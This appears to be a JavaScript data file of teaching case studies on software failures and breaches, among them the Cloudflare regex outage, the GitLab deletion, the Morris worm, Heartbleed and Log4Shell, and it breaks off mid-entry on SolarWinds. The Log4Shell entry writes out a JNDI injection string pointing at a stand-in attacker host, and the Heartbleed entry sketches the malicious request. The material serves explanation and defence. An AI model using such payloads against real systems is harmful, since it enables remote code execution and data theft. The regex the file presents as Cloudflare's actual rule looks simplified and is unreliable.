  { p: "In 2013, a jury in Oklahoma found Toyota liable in a case involving a fatal crash. The critical evidence came from embedded systems experts Michael Barr and Phillip Koopman, who had been given access to Toyota's engine control unit (ECU) source code and spent eighteen months analysing it." },

  { h: "What the code looked like" },
  { l: [
   "**11,000 global variables.** The entire application was wired together through shared mutable state, making it functionally impossible to reason about which module could affect which behaviour.",
   "**Spaghetti control flow.** Individual functions ran to thousands of lines. The call graph was effectively untraceable without tooling.",
   "**No MISRA compliance.** The MISRA C coding standard exists specifically for safety-critical automotive software. Toyota's codebase violated it pervasively.",
   "**No static analysis.** Tools that could have caught categories of defects automatically were not used.",
   "**Insufficient stack protection.** Stack overflow could corrupt adjacent memory, and the RTOS had no stack-depth monitoring on critical tasks."
  ] },
  { n: "The failsafe was a function called the *task monitor*, which was supposed to detect conflicts between throttle and brake signals and cut fuel. The experts demonstrated that a specific task-death scenario in the RTOS could kill the monitor task itself, leaving the system without a failsafe — and that Toyota had not tested for this condition.",
    nt: "The failsafe that could be killed" },

  { h: "The broader lesson" },
  { p: "The code was not written by incompetent engineers. It had been developed over many years, by many teams, under schedule pressure, without the structural discipline that safety-critical code requires. Every individual shortcut was explicable. The cumulative effect was a system nobody could verify." },
  { p: "The $1.2 billion criminal penalty Toyota paid in 2014 was the largest ever imposed on an automotive company. The National Highway Traffic Safety Administration's investigation ran for years. The case is now the primary reference in arguments for static analysis, coding standards, formal verification, and independent code review in automotive and embedded software." },

  { h: "What changed" },
  { l: [
   "ISO 26262, the automotive functional safety standard, gained enforcement teeth and wider adoption after this case.",
   "MISRA C compliance became a baseline expectation, not a nice-to-have, in automotive firmware.",
   "Static analysis tools (Coverity, Polyspace, LDRA) became standard in automotive development pipelines.",
   "The case is now taught in university embedded systems and software engineering courses as the canonical example of what happens when code quality is not treated as a safety property."
  ] }
 ],
 k: [
  "Global variables at scale make reasoning about system behaviour impossible.",
  "A failsafe that can itself be disabled by a software fault is not a failsafe.",
  "Coding standards exist because the cumulative effect of individually reasonable shortcuts is a system nobody can verify.",
  "The absence of static analysis in safety-critical code is a management decision with legal consequences."
 ],
 r: ["Firmware", "Race Condition", "Mutex", "Unit Test", "Code Review", "Formal Verification", "Technical Debt"],
 src: [
  { t: "Barr — Expert testimony in Bookout v. Toyota Motor Corp. (2013)", u: "https://www.safetyresearch.net/toyota-unintended-acceleration-and-the-big-bowl-of-spaghetti-code/" },
  { t: "NHTSA/NASA — Technical Assessment of Toyota Electronic Throttle Control", u: "https://www.nhtsa.gov/staticfiles/nvs/pdf/NASA-UA_report.pdf" }
 ]
},

{
 t: "The Cloudflare Regex Outage",
 s: "One regular expression, 27 minutes, half the internet",
 y: 2019, when: "2 July 2019",
 g: ["regex", "algorithmic complexity", "waf", "deployment"],
 tldr: "A Cloudflare engineer deployed a Web Application Firewall rule containing a regular expression with catastrophic backtracking. The regex caused CPU usage to spike to 100% across every Cloudflare edge server worldwide. For 27 minutes, sites behind Cloudflare returned 502 errors — affecting roughly 10% of HTTP requests on the internet. It is the clearest real-world example of algorithmic complexity having production consequences.",
 say: [
  "A single regex took down Cloudflare's entire edge fleet — every server in every data centre hit 100% CPU simultaneously.",
  "The specific pattern was `(?:(?:\\\"[^\\\"]*)+)` — a nested quantifier that causes exponential backtracking on certain inputs.",
  "It is the best example of algorithmic complexity being a production concern, not just a textbook exercise.",
  "The WAF rules did not go through the same staged deployment as code changes, which is the same lesson CrowdStrike would learn five years later."
 ],
 b: [
  { h: "What happened" },
  { p: "Cloudflare's Web Application Firewall uses regular expressions to detect attack patterns in HTTP traffic. On 2 July 2019, an engineer deployed a new rule intended to detect a specific injection pattern. The rule contained a regular expression with nested quantifiers." },
  { p: "When the regex engine encountered certain input strings that partially matched, it entered catastrophic backtracking — the number of paths the engine must explore grows exponentially with input length. Every Cloudflare edge server began consuming 100% CPU processing these matches, and legitimate traffic could not be served." },

  { h: "Why backtracking matters" },
  { p: "Most regex engines are backtracking implementations (NFA-based). When a pattern has ambiguous branching — particularly nested repetitions like `(a+)+` or `(a|a)*` — and the input almost-but-not-quite matches, the engine tries every possible way to partition the input before concluding failure." },
  { x: { lang: "text", code:
"Pattern:  (a+)+$\nInput:    aaaaaaaaaaaaaaaaX\n\nThe engine tries:\n  (aaaaaaaaaaaaaaaa)X  — fails at X\n  (aaaaaaaaaaaaaaa)(a)X — fails\n  (aaaaaaaaaaaaaa)(aa)X — fails\n  (aaaaaaaaaaaaaa)(a)(a)X — fails\n  ... exponentially many partitions\n\n16 'a' characters = ~65,000 steps\n32 'a' characters = ~4 billion steps" } },
  { n: "This is the concept of time complexity made viscerally concrete. The regex was O(2^n) on adversarial input, and the WAF was applying it to every HTTP request. Textbook algorithmic analysis is not academic — it is the difference between a working CDN and a global outage.",
    nt: "Big-O is not academic" },

  { h: "The 27 minutes" },
  { tl: [
    { t: "13:42 UTC", d: "The WAF rule is deployed globally." },
    { t: "13:42", d: "CPU utilisation spikes to 100% across all edge locations. 502 errors begin." },
    { t: "~13:45", d: "Alerts fire. The team initially suspects an attack." },
    { t: "~13:55", d: "The WAF rule change is identified as the cause." },
    { t: "14:02", d: "A global WAF kill switch is used to disable the entire managed ruleset." },
    { t: "14:09", d: "Traffic begins recovering. Full recovery follows within minutes." }
  ] },

  { h: "What changed" },
  { l: [
   "Cloudflare migrated its WAF engine to use a regex implementation that does not backtrack (RE2-like), trading some regex features for guaranteed linear-time execution.",
   "All WAF rule changes now go through staged deployment with automatic rollback on performance regression.",
   "A CPU-time circuit breaker was added so a single rule cannot consume unbounded processing time.",
   "The incident became a widely-used teaching example for why algorithmic complexity analysis is a practical engineering skill."
  ] }
 ],
 k: [
  "Catastrophic backtracking makes a regex with nested quantifiers exponentially slow on adversarial input.",
  "Algorithmic complexity is a production concern, not a textbook abstraction.",
  "Configuration and rule changes need the same deployment discipline as code changes.",
  "Use regex engines with linear-time guarantees (RE2, Rust regex) when processing untrusted input."
 ],
 r: ["Regular Expression", "Time Complexity", "Big O Notation", "Deployment", "Canary Deployment", "Monitoring"],
 src: [
  { t: "Cloudflare — Details of the Cloudflare outage on July 2, 2019", u: "https://blog.cloudflare.com/details-of-the-cloudflare-outage-on-july-2-2019/" }
 ]
},

{
 t: "The GitLab Database Deletion",
 s: "rm -rf on production, and the backup was empty",
 y: 2017, when: "31 January 2017",
 g: ["databases", "backups", "incident", "transparency"],
 tldr: "A tired GitLab engineer, working late to fix a replication issue, accidentally ran a data deletion command on the production database instead of the staging replica. When the team went to restore from backup, they discovered that multiple backup systems had been silently failing for months. Six hours of data was permanently lost. GitLab live-streamed the entire recovery on YouTube — an unprecedented level of incident transparency that became as notable as the failure itself.",
 say: [
  "The engineer ran `rm -rf` on the wrong database directory — production instead of the staging replica he was trying to fix.",
  "Five different backup and replication mechanisms were in place. None of them worked when needed.",
  "GitLab live-streamed the recovery on YouTube and published a detailed public postmortem, which became the gold standard for incident transparency.",
  "The lesson everyone takes from it: an untested backup is not a backup."
 ],
 b: [
  { h: "What happened" },
  { p: "On 31 January 2017, GitLab.com experienced a spike in database replication lag. An engineer worked through the evening to fix it, which involved removing and re-syncing the PostgreSQL replica. Late at night, after multiple failed attempts, the engineer ran a directory removal command. On the wrong server." },
  { p: "About 300GB of live production data began being deleted. The engineer realised within seconds and stopped the command, but roughly six hours of data — issues, merge requests, comments, CI/CD data — was gone." },

  { h: "Five backup failures" },
  { l: [
   "**LVM snapshots** — not configured for the database server.",
   "**Regular PostgreSQL backups (pg_dump)** — had been silently failing because the version of pg_dump did not match the database version. Nobody had checked.",
   "**Continuous WAL archiving** — was not set up for this particular database.",
   "**Azure disk snapshots** — enabled, but only taken every 24 hours, so they would still lose a day.",
   "**S3 backup sync** — was running, but it was syncing the output of the failing pg_dump, so it was syncing empty files."
  ] },
  { n: "Each backup system had a plausible reason for existing and a plausible reason for not working. The failure was not in any individual system — it was that nobody had tested restoration from any of them end to end. A backup you have never restored from is a hope, not a plan.",
    nt: "The backup that matters is the one you have tested" },

  { h: "The response" },
  { p: "GitLab's response became as significant as the incident. They set up a public Google Doc tracking every step of the recovery. They live-streamed the work on YouTube, with engineers working through the night visible to anyone watching. The postmortem was exhaustive and named names — including that the engineer made an honest mistake while tired." },
  { tl: [
    { t: "23:00 UTC", d: "The deletion happens. Engineer stops it within seconds." },
    { t: "23:00–02:00", d: "Team discovers each backup mechanism has failed." },
    { t: "02:00 onwards", d: "Recovery begins from the Azure disk snapshot taken 6 hours earlier." },
    { t: "Next day", d: "GitLab.com is restored. Six hours of data is permanently lost." },
    { t: "Following week", d: "Detailed public postmortem is published." }
  ] },

  { h: "What changed" },
  { l: [
   "GitLab implemented automated daily backup restoration tests — a separate pipeline that restores the backup to a clean environment and verifies it works.",
   "Backup monitoring was added: alerts fire if backup size drops or backup age exceeds threshold.",
   "Production access was tightened with additional safeguards against destructive commands.",
   "The incident normalised radical transparency in postmortems across the industry."
  ] }
 ],
 k: [
  "An untested backup is indistinguishable from no backup.",
  "Multiple backup systems create an illusion of safety that evaporates when you actually need to restore.",
  "Tired engineers making mistakes is a systems problem, not a personnel problem — build guardrails.",
  "Radical transparency in incident response builds more trust than silence."
 ],
 r: ["Replication", "Disaster Recovery", "PostgreSQL", "Monitoring", "Incident Response", "Runbook"],
 src: [
  { t: "GitLab — Postmortem of database outage of 31 January 2017", u: "https://about.gitlab.com/blog/2017/02/10/postmortem-of-database-outage-of-january-31/" }
 ]
},

{
 t: "The Facebook Outage",
 s: "BGP, DNS, and the door locks that needed the internet",
 y: 2021, when: "4 October 2021",
 g: ["bgp", "dns", "networking", "blast radius"],
 tldr: "A routine maintenance command withdrew Facebook's BGP route advertisements, making every Facebook, Instagram, and WhatsApp server unreachable from the internet. DNS servers could no longer be reached either, so the domain names stopped resolving entirely. Recovery was delayed because Facebook's internal tools, remote access systems, and even the badge readers on data centre doors all depended on the infrastructure that was down. The outage lasted about six hours.",
 say: [
  "A BGP withdrawal made Facebook's IP ranges disappear from the internet's routing tables — not just slow, genuinely unreachable.",
  "DNS failed because the authoritative nameservers were inside the unreachable network, so the domain names vanished from the internet.",
  "Engineers could not fix it remotely because VPN and remote access tools ran on the same infrastructure that was down.",
  "The badge readers on the data centre doors needed the network to authenticate, so engineers initially could not get into the building."
 ],
 b: [
  { h: "The mechanism" },
  { p: "Facebook runs its own backbone network connecting its data centres, and announces routes to the internet via BGP (Border Gateway Protocol). On 4 October 2021, during routine backbone maintenance, a command was issued that unintentionally withdrew all of Facebook's BGP route announcements." },
  { p: "Within minutes, every router on the internet removed Facebook's IP prefixes from their routing tables. Packets addressed to Facebook, Instagram, WhatsApp or Messenger had nowhere to go. It was not a performance problem — the addresses ceased to exist from the internet's perspective." },

  { h: "The DNS cascade" },
  { p: "Facebook's authoritative DNS servers lived inside the network that had just become unreachable. When DNS resolvers around the world tried to look up `facebook.com`, they could not reach the nameservers to get an answer. Cached entries expired. Within minutes, `facebook.com` returned `NXDOMAIN` — domain not found — as though the domain had never existed." },
  { n: "This is the difference between a service being down and a service being unfindable. A server error returns a 500; this returned nothing at all, because the name resolution step failed before any connection was attempted. Every system worldwide that depended on Facebook's OAuth, sharing widgets or APIs failed at the DNS layer.",
    nt: "Unfindable is worse than unreachable" },

  { h: "Why recovery took six hours" },
  { l: [
   "**Remote access was down.** Facebook's VPN, internal dashboards, and remote management systems ran on the same infrastructure. Engineers could not SSH into anything.",
   "**Badge readers needed the network.** The physical access control systems in data centres authenticated against internal services that were unreachable.",
   "**The fix required physical presence.** Engineers had to physically travel to data centres and gain access to out-of-band management consoles to re-establish the BGP sessions.",
   "**Verification was slow.** Once BGP routes were restored, the cascade of DNS caches repopulating and services restarting took additional time."
  ] },
  { tl: [
    { t: "15:39 UTC", d: "BGP routes are withdrawn. Facebook disappears from the internet." },
    { t: "Within minutes", d: "DNS entries expire and stop resolving. 3.5 billion users lose access." },
    { t: "15:40–17:00", d: "Engineers cannot access systems remotely. Physical access to data centres is complicated by dependent access controls." },
    { t: "~17:00", d: "Engineers reach out-of-band consoles and begin restoring BGP." },
    { t: "~21:00 UTC", d: "Services gradually come back online. Full recovery follows." }
  ] },

  { h: "What changed" },
  { l: [
   "Facebook invested in out-of-band management systems that do not depend on the production network.",
   "Physical access systems were decoupled from production infrastructure.",
   "BGP configuration changes gained additional validation and staged rollout.",
   "The incident became the go-to teaching example for BGP and DNS in networking courses."
  ] }
 ],
 k: [
  "BGP is the routing protocol of the internet, and a withdrawal makes your entire network vanish, not just go slow.",
  "Hosting your DNS inside the network you are advertising means the name disappears with the route.",
  "Recovery tools that depend on the thing being recovered create a circular dependency that extends outages by hours.",
  "Out-of-band management is not optional for critical infrastructure."
 ],
 r: ["DNS", "TCP/IP Model", "High Availability", "Disaster Recovery", "Monitoring", "Incident Response"],
 src: [
  { t: "Meta Engineering — More details about the October 4 outage", u: "https://engineering.fb.com/2021/10/05/networking-traffic/outage-details/" }
 ]
},

{
 t: "The Morris Worm",
 s: "The first internet worm, written by a grad student",
 y: 1988, when: "2 November 1988",
 g: ["worm", "buffer overflow", "unix", "internet"],
 tldr: "Robert Tappan Morris, a Cornell graduate student, released a self-replicating program onto the early internet. It exploited a buffer overflow in fingerd, a debug backdoor in sendmail, and weak password guessing — all routine Unix attack surfaces. A bug in the reinfection-limiting code caused it to spread far faster than intended, effectively taking down about 10% of the internet's roughly 60,000 connected machines. Morris became the first person convicted under the Computer Fraud and Abuse Act.",
 say: [
  "It exploited three things: a buffer overflow in fingerd, a debug mode in sendmail, and weak passwords via rsh/rexec.",
  "The bug that made it destructive was in the code meant to prevent reinfection — it reinfected machines repeatedly, consuming all resources.",
  "It hit roughly 6,000 of the internet's 60,000 machines — about 10% of the entire internet at the time.",
  "Morris was the first person convicted under the CFAA, and later became a professor at MIT and a Y Combinator founder."
 ],
 b: [
  { h: "The mechanism" },
  { p: "The worm used three propagation methods, each targeting a common Unix service:" },
  { l: [
   "**Buffer overflow in fingerd.** The finger daemon read input into a fixed-size buffer without checking length. The worm sent a payload that overflowed the buffer, overwrote the return address, and executed arbitrary code — the classic stack-smashing attack that would dominate security research for the next two decades.",
   "**Sendmail DEBUG mode.** Many sendmail installations had a debug option enabled that allowed remote command execution. The worm used it to bootstrap itself onto machines.",
   "**Password guessing via rsh/rexec.** The worm tried a short dictionary of common passwords, the username itself, and the username reversed. It succeeded disturbingly often."
  ] },
  { p: "Once on a machine, it downloaded its own source and compiled itself — an early example of what would later be called a dropper pattern." },

  { h: "The bug in the worm" },
  { p: "Morris intended the worm to spread slowly and not disrupt systems. To prevent a machine from being reinfected, the worm checked whether a copy was already running and, if so, exited — most of the time. One in seven times, it would continue regardless, as a defence against administrators running a fake worm to immunise their machines." },
  { n: "That one-in-seven chance was the mistake. On a network where the worm could reach the same machine multiple times from different neighbours, reinfection was common. Machines ended up running dozens of copies, each consuming CPU and memory, until the system was unusable. The worm was not malicious by design — it was malicious by arithmetic.",
    nt: "The reinfection rate was wrong" },

  { h: "The aftermath" },
  { tl: [
    { t: "2 Nov 1988, evening", d: "The worm is released from MIT (not Cornell, to obscure its origin)." },
    { t: "Overnight", d: "Machines at universities, research labs and military sites are overwhelmed." },
    { t: "3 Nov 1988", d: "Administrators begin disconnecting from the network to stop reinfection. Email, at the time the primary communication method for coordinating a response, is disrupted." },
    { t: "Following days", d: "The worm is decompiled and analysed. Patches are distributed." },
    { t: "1990", d: "Morris is convicted under the Computer Fraud and Abuse Act — the first conviction under the law." }
  ] },
  { p: "Morris was sentenced to three years probation, 400 hours of community service and a $10,050 fine. He went on to complete his PhD, became a professor at MIT, and co-founded Y Combinator with Paul Graham." },

  { h: "What changed" },
  { l: [
   "CERT/CC (Computer Emergency Response Team) was created at Carnegie Mellon in direct response to the worm, establishing the model for coordinated vulnerability disclosure.",
   "Buffer overflows became the defining security research topic for the next two decades, leading eventually to stack canaries, ASLR, DEP/NX bits and memory-safe languages.",
   "The incident demonstrated that the internet's trust model — where machines freely accepted connections from peers — was fundamentally inadequate.",
   "It made computer security a field, not a hobby."
  ] }
 ],
 k: [
  "Buffer overflows in C were the dominant vulnerability class for decades, and this was the first major demonstration.",
  "Self-replicating code that is slightly more aggressive than intended can be catastrophically destructive.",
  "Coordinated incident response requires communication channels that do not depend on the thing being attacked.",
  "The internet was designed for trust between peers, and security was retrofitted — a pattern that persists."
 ],
 r: ["Buffer Overflow", "Memory Safety", "Operating System", "Shell", "Authentication", "Incident Response"],
 src: [
  { t: "Spafford — The Internet Worm Program: An Analysis, Purdue Technical Report (1988)", u: "https://spaf.cerias.purdue.edu/tech-reps/823.pdf" },
  { t: "RFC 1135 — The Helminthiasis of the Internet (1989)", u: "https://www.rfc-editor.org/rfc/rfc1135" }
 ]
},

{
 t: "Mars Climate Orbiter",
 s: "Metric versus imperial, $327 million",
 y: 1999, when: "23 September 1999",
 g: ["aerospace", "unit mismatch", "integration testing", "type safety"],
 tldr: "NASA's Mars Climate Orbiter was lost because one software component produced force values in pound-force seconds while the rest of the system expected newton seconds. Nobody caught the mismatch during integration testing. The spacecraft approached Mars 170 kilometres lower than intended and either burned up in the atmosphere or skipped off into solar orbit. A $327 million mission was lost to what is essentially a type error.",
 say: [
  "One module output pound-force seconds; the navigation system expected newton seconds. That is the entire root cause.",
  "It is the canonical argument for strong type systems — a language that distinguishes between units would have caught it at compile time.",
  "The mission specification explicitly required SI units. The ground software team used imperial. Nobody verified.",
  "It is taught in every software engineering course as the example of integration testing failure."
 ],
 b: [
  { h: "What happened" },
  { p: "Mars Climate Orbiter was launched in December 1998 to study the Martian atmosphere. Navigation required precise knowledge of the small velocity changes imparted by thruster firings during the nine-month cruise." },
  { p: "Lockheed Martin built the ground software that calculated these impulses. The specification called for SI units (newton seconds). The software produced values in pound-force seconds — a factor of roughly 4.45 off. The navigation team at JPL used these values directly, assuming they were in the specified units." },

  { h: "The trajectory" },
  { p: "Over nine months of flight, the small errors accumulated. Each thruster firing was modelled as slightly wrong. Course corrections, calculated from the incorrect trajectory, compounded the problem rather than fixing it." },
  { tl: [
    { t: "Dec 1998", d: "Launch." },
    { t: "During cruise", d: "Navigation team notices the trajectory is not matching predictions. Deviations are noted but not traced to the root cause." },
    { t: "23 Sep 1999", d: "Mars Orbit Insertion burn. The spacecraft passes behind Mars at an altitude of about 57 km instead of the planned 226 km." },
    { t: "After loss of signal", d: "The spacecraft either burned up in the atmosphere or escaped into solar orbit. Contact was never re-established." }
  ] },
  { n: "The navigation team had actually noticed anomalies during the cruise and filed reports. The investigations did not trace the problem to the unit mismatch because the ground software was treated as verified. The classic failure mode: an anomaly is observed, investigated, and closed without finding the root cause, because a subsystem is assumed correct.",
    nt: "The anomaly was seen and dismissed" },

  { h: "The type safety argument" },
  { p: "This failure is frequently cited in programming language discussions. A type system that tracks physical units — or even a simpler approach like newtype wrappers — would have caught the mismatch at compile time. `NewtonSeconds` and `PoundForceSeconds` would be different types, and passing one where the other was expected would be a type error, not a silent conversion." },
  { x: { lang: "text", code:
"// What happened (pseudocode)\nfloat thruster_impulse = compute_impulse();  // returns lbf·s\nnavigation_update(thruster_impulse);          // expects N·s\n// Compiles. Runs. Loses a spacecraft.\n\n// What a type system could enforce\nNewtonSeconds thruster_impulse = compute_impulse();  // ERROR:\n// cannot assign PoundForceSeconds to NewtonSeconds" } },

  { h: "What changed" },
  { l: [
   "NASA's mishap investigation board recommended explicit unit checks at all software interfaces, not just in specifications.",
   "Integration testing practices were tightened to verify units, coordinate frames and sign conventions across subsystem boundaries.",
   "The incident is now the standard example in arguments for dimensional analysis in code and for type systems that encode physical quantities.",
   "Subsequent Mars missions (Mars Exploration Rovers, Curiosity, Perseverance) all flew successfully."
  ] }
 ],
 k: [
  "A unit mismatch is a type error that most type systems do not catch — and it cost $327 million.",
  "Integration testing must verify the assumptions each component makes about the data it receives.",
  "Anomalies observed during operation and closed without root cause are failures waiting to compound.",
  "Specifications are not self-enforcing — someone must verify that the code matches what the spec says."
 ],
 r: ["Unit Test", "Integration Test", "Compiler", "Formal Verification", "Code Review"],
 src: [
  { t: "NASA — Mars Climate Orbiter Mishap Investigation Board Phase I Report (1999)", u: "https://llis.nasa.gov/llis_lib/pdf/1009464main1_0641-mr.pdf" }
 ]
}

]);


/* data/studies/02-breaches.js */
/* Case studies — Breaches & Security. */
TD.addStudies("breaches", [

{
 t: "Heartbleed",
 s: "Two maintainers, one missing bounds check",
 y: 2014, when: "April 2014",
 g: ["openssl", "memory safety", "tls", "open source"],
 tldr: "A missing length check in OpenSSL's TLS heartbeat extension let anyone ask a server for up to 64KB of its own memory, repeatedly, leaving no trace in any log. Private keys, session cookies and passwords were all fair game, on roughly 17% of the internet's secure web servers. The bug had been live for two years, and the aftermath revealed that the library securing most of the internet was maintained by a couple of people on about $2,000 a year in donations.",
 say: [
  "The mechanism is simple enough to explain in one sentence: you say *send me back 64KB* while sending one byte, and the server trusts your number.",
  "It left no trace — there was no log entry for a heartbeat request, so nobody could tell whether they had been exploited.",
  "It was the first vulnerability with a logo, a name and a website, and that branding genuinely changed how quickly people patched.",
  "The real legacy is funding: it exposed that critical infrastructure was maintained by volunteers, which led to the Core Infrastructure Initiative."
 ],
 b: [
  { h: "The bug" },
  { p: "TLS has a heartbeat extension: a keep-alive where one side sends a small payload and the other echoes it back, to confirm the connection is still live. The request contains the payload and, separately, a number saying how long that payload is." },
  { p: "OpenSSL's implementation allocated a response buffer using the *claimed* length and copied that many bytes from the location of the received payload. It never checked whether the claimed length matched the actual length received." },
  { x: { lang: "text", code:
"Attacker sends:   payload = \"bird\"   claimed length = 65535\n\nServer does:      allocate 65535 bytes\n                  memcpy(response, payload_ptr, 65535)\n                  send(response)\n\nServer returns:   \"bird\" + 65531 bytes of whatever\n                  happened to be next in memory" } },
  { p: "That adjacent memory was whatever the process had recently been handling: decrypted request bodies, session cookies, usernames and passwords, and — because it lives in the same process — potentially the server's own TLS private key. An attacker could repeat the request indefinitely, getting a fresh 64KB slice each time." },
  { n: "There was no log entry for a heartbeat request and no anomaly to detect. After disclosure, essentially every affected operator had to assume compromise and act accordingly — revoke and reissue certificates, invalidate all sessions, force password resets — because proving you had *not* been exploited was impossible.",
    nt: "Undetectable is worse than severe" },

  { h: "How long it was live" },
  { tl: [
    { t: "Dec 2011", d: "The heartbeat implementation is committed to OpenSSL, reviewed and merged." },
    { t: "Mar 2012", d: "OpenSSL 1.0.1 ships with the vulnerable code. It becomes the default in major Linux distributions." },
    { t: "Mar 2014", d: "Neel Mehta of Google discovers the flaw. Independently, Codenomicon finds it while testing their own product." },
    { t: "7 Apr 2014", d: "Public disclosure, with the name, the logo and heartbleed.com. OpenSSL 1.0.1g ships the same day." },
    { t: "Following weeks", d: "Mass certificate reissuance and revocation — large enough to visibly stress the certificate revocation infrastructure." }
  ] },

  { h: "Why it mattered beyond the bug" },
  { p: "The vulnerability itself was a straightforward memory-safety failure of a kind that C makes easy and that a memory-safe language would have prevented outright. The uncomfortable part was organisational." },
  { l: [
   "OpenSSL secured a large share of the internet's TLS traffic and had roughly one full-time-equivalent developer.",
   "The project's annual donations were in the region of $2,000. Companies with billion-dollar revenues depended on it and contributed nothing.",
   "The *many eyes make all bugs shallow* argument had been widely used to justify trusting open source security code. Two years of exposure in the most scrutinised security library in the world undercut it.",
   "In response, the Linux Foundation launched the Core Infrastructure Initiative, with funding from Amazon, Google, Microsoft, IBM, Intel and others, to pay for maintenance of critical open source projects. OpenBSD forked OpenSSL into LibreSSL to aggressively remove legacy code."
  ] },

  { h: "What changed" },
  { p: "Certificate lifetimes shortened and automated reissuance became normal, which contributed to the environment Let's Encrypt launched into the following year. Forward secrecy moved from a nice-to-have to a default, because it limits what a stolen private key retroactively unlocks. And funding open source infrastructure became a recognised corporate responsibility rather than an act of charity — a conversation that Log4Shell and the XZ backdoor would each reopen." }
 ],
 k: [
  "Never trust a length supplied by the other side; validate it against what you actually received.",
  "A vulnerability that leaves no trace forces everyone to assume the worst, which multiplies the cost.",
  "Widespread use is not the same as widespread review.",
  "Memory-unsafe languages make this specific class of bug a permanent tax on the ecosystem."
 ],
 r: ["Buffer Overflow", "Memory Safety", "TLS", "Public-Key Cryptography", "Open Source", "CVE", "Authentication", "Zero-Day"],
 src: [
  { t: "CVE-2014-0160 — National Vulnerability Database", u: "https://nvd.nist.gov/vuln/detail/CVE-2014-0160" },
  { t: "heartbleed.com — the original disclosure site", u: "https://heartbleed.com/" }
 ]
},

{
 t: "Log4Shell",
 s: "A log line that runs code",
 y: 2021, when: "December 2021",
 g: ["java", "rce", "dependencies", "sbom"],
 tldr: "Log4j, the default logging library across the Java ecosystem, would interpret special syntax inside the strings it was asked to log — including a directive to fetch and execute a Java class from a remote server. Logging a username was enough. It scored the maximum 10.0 on CVSS, could be triggered by putting a string in a User-Agent header or a Minecraft chat message, and nobody could immediately tell where they had Log4j because it arrived as a transitive dependency.",
 say: [
  "The one-liner: Log4j evaluated `${…}` expressions inside the text it was logging, and one of the supported expressions did a remote class load.",
  "It was trivially exploitable — change your iPhone's name, put it in a HTTP header, type it in a game chat, and it would land in someone's logs.",
  "The hard part was not patching, it was inventory: nobody had a list of where Log4j was, because it came in through other dependencies.",
  "It is the single biggest reason SBOMs went from a compliance checkbox to something engineering teams actually care about."
 ],
 b: [
  { h: "The mechanism" },
  { p: "Log4j 2 supports **message lookup substitution** — placeholders inside a log message that get resolved at logging time, such as `${java:version}`. One of the supported lookups was JNDI, the Java Naming and Directory Interface, which can resolve a name against a remote directory service over LDAP or RMI." },
  { p: "If the resolved object was a reference to a remote class, older JDK configurations would fetch and instantiate it. So the following sequence was enough:" },
  { x: { lang: "text", code:
"1. Attacker sends any input that will be logged, containing:\n     ${jndi:ldap://attacker.example/a}\n\n2. Application logs it:\n     log.info(\"Login failed for user {}\", username);\n\n3. Log4j resolves the lookup, contacts attacker.example,\n   fetches a class file, and executes it.\n\n   Remote code execution, as the application user." } },
  { n: "The vulnerable input did not need to reach a form field or an API parameter. It only needed to reach a log statement. User-Agent headers, HTTP referrers, usernames on failed logins, filenames, chat messages, and — famously — the name of an iPhone appearing in a device list were all viable delivery paths.",
    nt: "Any input that gets logged is an attack surface" },

  { h: "Why the response was so painful" },
  { p: "Log4j is not usually a dependency you chose. It arrives underneath a framework, which arrived underneath another library. Teams ran their build tools and found Log4j three or four levels deep in dependency trees they had never inspected." },
  { l: [
   "Java applications are frequently packaged as fat JARs or WARs with dependencies bundled, so scanning source manifests was insufficient — you had to scan artefacts.",
   "Vendors had to audit their own products, and customers had to wait on vendor patches for appliances and closed-source software they could not inspect.",
   "The first patch, 2.15.0, was found to be incomplete, followed by 2.16.0 and then 2.17.0 for further issues. Teams patched three times in a fortnight.",
   "Because attacks were trivial to automate, mass scanning of the internet began within hours of disclosure."
  ] },
  { tl: [
    { t: "24 Nov 2021", d: "Chen Zhaojun of Alibaba Cloud reports the vulnerability to the Apache Software Foundation." },
    { t: "9 Dec 2021", d: "A working exploit circulates publicly. Mass scanning begins almost immediately." },
    { t: "10 Dec 2021", d: "CVE-2021-44228 is published with a CVSS score of 10.0. Log4j 2.15.0 released." },
    { t: "13–18 Dec 2021", d: "Follow-up releases 2.16.0 and 2.17.0 address further issues found under scrutiny." },
    { t: "Into 2022", d: "US CISA issues emergency directives; the incident becomes a reference point in software supply chain policy." }
  ] },

  { h: "What changed" },
  { l: [
   "**SBOMs became real.** A Software Bill of Materials — a machine-readable inventory of everything in a build — moved from a policy aspiration to something organisations actually generate and query. The first question in the incident was *do we have it*, and almost nobody could answer.",
   "**Dependency scanning moved into CI.** Not as a periodic audit but as a gate, with the ability to answer *which of our services ship this library, at which version* in minutes.",
   "**Feature surface got scrutiny.** Log4j's lookup feature was doing something few users knew existed and almost none needed. *What else does this dependency do that we never asked for* became a legitimate review question.",
   "**Funding, again.** As with Heartbleed, a piece of critical infrastructure maintained by a small volunteer team had held up an enormous share of global software."
  ] }
 ],
 k: [
  "User input reaching a log statement is user input reaching your system.",
  "You cannot patch what you cannot locate — dependency inventory is a prerequisite for incident response.",
  "Transitive dependencies carry features you never evaluated and would not have chosen.",
  "Expect follow-up releases; the first patch under emergency pressure is often incomplete."
 ],
 r: ["Dependency", "Supply Chain Attack", "CVE", "Zero-Day", "Logging", "Endpoint", "Sandboxing", "Principle of Least Privilege"],
 src: [
  { t: "CVE-2021-44228 — National Vulnerability Database", u: "https://nvd.nist.gov/vuln/detail/CVE-2021-44228" },
  { t: "Apache Log4j Security Vulnerabilities", u: "https://logging.apache.org/log4j/2.x/security.html" }
 ]
},

{
 t: "SolarWinds",
 s: "When the build system is the target",
 y: 2020, when: "December 2020",
 g: ["supply chain", "nation state", "build pipeline", "signing"],
 tldr: "Attackers compromised SolarWinds' build system and inserted a backdoor into the Orion network-monitoring product. The malicious code was compiled into official releases and signed with SolarWinds' own certificate, so every downstream check passed. Around 18,000 organisations installed it; a smaller, deliberately chosen subset — including US federal agencies — were then actively exploited. It had been running for months before anyone noticed.",
 say: [
  "The key idea: they did not attack the product, they attacked the pipeline that builds the product.",
  "Everything downstream was valid — the signature checked out, because SolarWinds really did sign it.",
  "It was found by FireEye noticing an unexplained second device enrolled for 2FA on an employee account, not by any scanner.",
  "It is the reason build provenance, reproducible builds and frameworks like SLSA became mainstream conversations."
 ],
 b: [
  { h: "What happened" },
  { p: "SolarWinds Orion is network and infrastructure monitoring software. By its nature it runs with broad privileges and wide network visibility — exactly the position an attacker would want." },
  { p: "Rather than finding a vulnerability in Orion, the attackers gained access to SolarWinds' internal build environment and inserted code into the build process itself. When SolarWinds compiled Orion, the backdoor — later named **SUNBURST** — was baked into the resulting binary, which was then signed with SolarWinds' legitimate code-signing certificate and shipped through normal update channels." },
